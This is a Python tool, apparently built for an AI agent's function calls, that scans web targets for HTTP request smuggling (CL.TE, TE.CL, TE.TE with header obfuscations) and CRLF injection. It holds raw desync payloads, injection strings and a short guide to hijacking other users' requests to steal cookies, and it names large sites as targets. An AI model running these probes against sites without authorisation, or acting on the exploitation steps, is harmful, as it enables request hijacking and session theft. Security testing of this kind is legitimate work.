"""
HTTP request smuggling detector — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE variants.
Exploits desync between front-end (CDN/LB) and back-end servers.
Critical for targets behind reverse proxies (Apple, Google, YouTube).
"""

import requests
import socket
import ssl
import time
import re
from urllib.parse import urlparse

from tools.target_reachability import (
    format_fallback_notice,
    format_unreachable_error,
    resolve_web_target,
)

HDR = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"}


def _raw_request(host, port, data, use_ssl=True, timeout=10):
    """Send raw HTTP request for smuggling tests."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        sock.sendall(data.encode() if isinstance(data, str) else data)
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        sock.close()
        return response.decode("utf-8", errors="replace")
    except Exception as e:
        return f"ERROR: {e}"


def _detect_frontend(url):
    """Detect reverse proxy / load balancer."""
    info = {"proxy": None, "supports_te": False, "supports_cl": False}
    try:
        r = requests.get(url, headers=HDR, timeout=10, verify=False)
        h = {k.lower(): v.lower() for k, v in r.headers.items()}

        # Detect proxy
        if "via" in h:
            info["proxy"] = f"Via: {h['via']}"
        if "server" in h:
            srv = h["server"]
            if any(p in srv for p in ["nginx", "apache", "cloudflare", "akamai", "fastly", "varnish", "haproxy", "envoy"]):
                info["proxy"] = f"Server: {srv}"
        if "x-served-by" in h:
            info["proxy"] = f"X-Served-By: {h['x-served-by']}"

        # Check Transfer-Encoding support
        try:
            te_headers = {**HDR, "Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
            body = "0\r\n\r\n"
            r_te = requests.post(url, data=body, headers=te_headers, timeout=5, verify=False)
            if r_te.status_code < 500:
                info["supports_te"] = True
        except Exception:
            pass

        info["supports_cl"] = True  # CL is always supported

    except Exception:
        pass
    return info


def _test_cl_te(host, port, path, use_ssl):
    """Test CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding."""
    # Timing-based detection: If vulnerable, second request will time out
    # because back-end processes smuggled data as start of next request
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"Q\r\n"
        f"\r\n"
    )

    start = time.time()
    resp = _raw_request(host, port, payload, use_ssl, timeout=10)
    elapsed = time.time() - start

    # If CL.TE vulnerable, the back-end will wait for the chunked body to complete
    # causing a delay or connection reset
    if elapsed > 5:
        return {"vulnerable": True, "type": "CL.TE", "elapsed": elapsed,
                "desc": "Front-end uses Content-Length, back-end uses Transfer-Encoding. Request desync detected (timing-based)."}
    if "400" in resp[:50] or "ERROR" in resp[:50]:
        return {"vulnerable": False, "type": "CL.TE", "error": resp[:100]}
    return {"vulnerable": False, "type": "CL.TE", "elapsed": elapsed}


def _test_te_cl(host, port, path, use_ssl):
    """Test TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length."""
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"
    )

    start = time.time()
    resp = _raw_request(host, port, payload, use_ssl, timeout=10)
    elapsed = time.time() - start

    if elapsed > 5:
        return {"vulnerable": True, "type": "TE.CL", "elapsed": elapsed,
                "desc": "Front-end uses Transfer-Encoding, back-end uses Content-Length. Request desync detected."}
    return {"vulnerable": False, "type": "TE.CL", "elapsed": elapsed}


def _test_te_te(host, port, path, use_ssl):
    """Test TE.TE: Both use Transfer-Encoding but can be confused with obfuscation."""
    obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: \x0bchunked",
        " Transfer-Encoding: chunked",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding\r\n: chunked",
        "Transfer-encoding: chunked",
    ]

    results = []
    for obf in obfuscations:
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"{obf}\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
            f"\r\n"
        )

        start = time.time()
        resp = _raw_request(host, port, payload, use_ssl, timeout=8)
        elapsed = time.time() - start

        if elapsed > 5:
            results.append({
                "vulnerable": True, "type": "TE.TE",
                "obfuscation": obf.split("\r\n")[0],
                "elapsed": elapsed,
                "desc": f"TE.TE desync with obfuscated header: {obf.split(chr(13))[0]}",
            })
            break

    return results


def _test_header_injection(url):
    """Test for CRLF injection in headers (related to smuggling)."""
    findings = []
    payloads = [
        ("%0d%0aInjected-Header: true", "Injected-Header"),
        ("%0d%0aSet-Cookie: pwned=true", "Set-Cookie"),
        ("%0d%0a%0d%0a<script>alert(1)</script>", "script"),
        ("\\r\\nInjected: true", "Injected"),
    ]

    for payload, check in payloads:
        test_url = f"{url}/{payload}"
        try:
            r = requests.get(test_url, headers=HDR, timeout=5, verify=False, allow_redirects=False)
            resp_headers = str(r.headers).lower()
            if check.lower() in resp_headers or check.lower() in r.text.lower():
                findings.append({
                    "type": "crlf_injection",
                    "payload": payload,
                    "desc": f"CRLF injection: '{check}' found in response",
                })
        except Exception:
            pass
    return findings


def http_smuggle(target, stream_callback=None):
    """
    Test for HTTP request smuggling vulnerabilities.
    Tests CL.TE, TE.CL, TE.TE variants with timing-based detection.
    """
    def _emit(msg):
        if stream_callback:
            stream_callback("smuggle_progress", {"message": msg})

    _emit("🌐 Resolving reachable target URL...")
    resolution = resolve_web_target(target, headers=HDR)
    if not resolution.get("ok"):
        _emit("  ❌ Target unreachable across allowed URL variants")
        return format_unreachable_error(target, resolution)

    base = (resolution.get("selected_url") or resolution.get("normalized_url") or target).rstrip("/")
    fallback_note = format_fallback_notice(resolution)
    if fallback_note:
        _emit("  ↪ %s" % fallback_note)

    parsed = urlparse(base)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    path = parsed.path or "/"

    _emit(f"🎯 HTTP Request Smuggling Scanner: {base}")
    start = time.time()
    findings = []

    # Phase 1: Detect front-end
    _emit("🔍 Phase 1: Detecting reverse proxy / load balancer...")
    frontend = _detect_frontend(base)
    if frontend["proxy"]:
        _emit(f"  Proxy detected: {frontend['proxy']}")
    _emit(f"  Transfer-Encoding support: {frontend['supports_te']}")

    # Phase 2: CL.TE test
    _emit("🔨 Phase 2: Testing CL.TE (Content-Length vs Transfer-Encoding)...")
    cl_te = _test_cl_te(host, port, path, use_ssl)
    if cl_te.get("vulnerable"):
        _emit(f"  🔴 CL.TE VULNERABLE! (response delayed {cl_te['elapsed']:.1f}s)")
        findings.append({
            "type": "CL.TE",
            "severity": "CRITICAL",
            "desc": cl_te["desc"],
            "elapsed": cl_te["elapsed"],
            "cwe": "CWE-444",
        })
    else:
        _emit(f"  ✗ CL.TE: Not vulnerable ({cl_te.get('elapsed', 0):.1f}s)")

    # Phase 3: TE.CL test
    _emit("🔨 Phase 3: Testing TE.CL (Transfer-Encoding vs Content-Length)...")
    te_cl = _test_te_cl(host, port, path, use_ssl)
    if te_cl.get("vulnerable"):
        _emit(f"  🔴 TE.CL VULNERABLE! (response delayed {te_cl['elapsed']:.1f}s)")
        findings.append({
            "type": "TE.CL",
            "severity": "CRITICAL",
            "desc": te_cl["desc"],
            "elapsed": te_cl["elapsed"],
            "cwe": "CWE-444",
        })
    else:
        _emit(f"  ✗ TE.CL: Not vulnerable ({te_cl.get('elapsed', 0):.1f}s)")

    # Phase 4: TE.TE test (obfuscation)
    _emit("🔨 Phase 4: Testing TE.TE with header obfuscation (9 variants)...")
    te_te_results = _test_te_te(host, port, path, use_ssl)
    for r in te_te_results:
        if r.get("vulnerable"):
            _emit(f"  🔴 TE.TE VULNERABLE via: {r['obfuscation']}")
            findings.append({
                "type": "TE.TE",
                "severity": "CRITICAL",
                "desc": r["desc"],
                "obfuscation": r["obfuscation"],
                "cwe": "CWE-444",
            })
    if not te_te_results:
        _emit("  ✗ TE.TE: No obfuscation variants worked")

    # Phase 5: CRLF injection
    _emit("🔨 Phase 5: Testing CRLF injection (header injection)...")
    crlf = _test_header_injection(base)
    for c in crlf:
        _emit(f"  🔴 CRLF: {c['desc']}")
        findings.append({
            "type": "CRLF",
            "severity": "HIGH",
            "desc": c["desc"],
            "payload": c["payload"],
            "cwe": "CWE-113",
        })

    # Phase 6: HTTP/2 downgrade test
    _emit("🔨 Phase 6: HTTP/2 downgrade detection...")
    try:
        r = requests.get(base, headers=HDR, timeout=5, verify=False)
        if hasattr(r, 'raw') and hasattr(r.raw, 'version'):
            if r.raw.version == 20:
                _emit("  HTTP/2 in use — H2.CL and H2.TE smuggling possible")
                findings.append({
                    "type": "H2_DETECTED",
                    "severity": "INFO",
                    "desc": "HTTP/2 detected — H2.CL and H2.TE request smuggling vectors should be tested with specialized tools (e.g., smuggler.py, h2csmuggler)",
                })
    except Exception:
        pass

    elapsed = time.time() - start

    # Format output
    lines = [
        f"HTTP REQUEST SMUGGLING SCAN for {base}",
        f"{'='*60}",
        f"Host: {host}:{port} | SSL: {use_ssl}",
        f"Proxy: {frontend.get('proxy', 'Not detected')}",
        f"Findings: {len(findings)} | Time: {elapsed:.1f}s\n",
    ]
    if fallback_note:
        lines = [fallback_note, ""] + lines

    critical = [f for f in findings if f["severity"] == "CRITICAL"]
    if critical:
        lines.append("🔴 CRITICAL — REQUEST SMUGGLING DETECTED")
        lines.append("-" * 40)
        for f in critical:
            lines.append(f"  Type: {f['type']}")
            lines.append(f"  {f['desc']}")
            if f.get("obfuscation"):
                lines.append(f"  Obfuscation: {f['obfuscation']}")
            lines.append(f"  CWE: {f['cwe']}")
            lines.append(f"  CVSS: 9.1 (Critical)")
            lines.append(f"  Impact: Request hijacking, auth bypass, cache poisoning, XSS for all users")
            lines.append("")

        lines.append("EXPLOITATION GUIDE")
        lines.append("-" * 40)
        smuggle_type = critical[0]["type"]
        if smuggle_type == "CL.TE":
            lines.append("  Front-end trusts Content-Length, back-end trusts Transfer-Encoding")
            lines.append("  1. Craft request with CL pointing to smuggled prefix")
            lines.append("  2. Smuggled prefix becomes start of next user's request")
            lines.append("  3. Hijack victim's request to steal cookies/tokens")
        elif smuggle_type == "TE.CL":
            lines.append("  Front-end trusts Transfer-Encoding, back-end trusts Content-Length")
            lines.append("  1. Chunked body with short CL leaves data in buffer")
            lines.append("  2. Leftover data prefixes next user's request")
        lines.append("")
        lines.append("  Use tools: smuggler.py, h2csmuggler, or Burp Suite Turbo Intruder")

    high = [f for f in findings if f["severity"] == "HIGH"]
    if high:
        lines.append("🟠 HIGH FINDINGS")
        lines.append("-" * 40)
        for f in high:
            lines.append(f"  [{f['type']}] {f['desc']}")
            if f.get("payload"):
                lines.append(f"  Payload: {f['payload']}")
        lines.append("")

    if not findings:
        lines.append("No request smuggling vulnerabilities detected.")
        lines.append("Note: Timing-based detection may miss some variants.")
        lines.append("Consider testing with Burp Suite or specialized smuggling tools for deeper analysis.")

    return "\n".join(lines)


TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "http_smuggle",
        "description": "Detect HTTP request smuggling vulnerabilities (CL.TE, TE.CL, TE.TE with 9 obfuscation variants). Uses timing-based detection to find desync between front-end proxy and back-end server. Also tests CRLF injection and HTTP/2 downgrade. Critical for sites behind reverse proxies, CDNs, and load balancers. Can lead to auth bypass, cache poisoning, and request hijacking. CVSS 9.1.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to test for request smuggling"
                }
            },
            "required": ["target"]
        }
    }
}
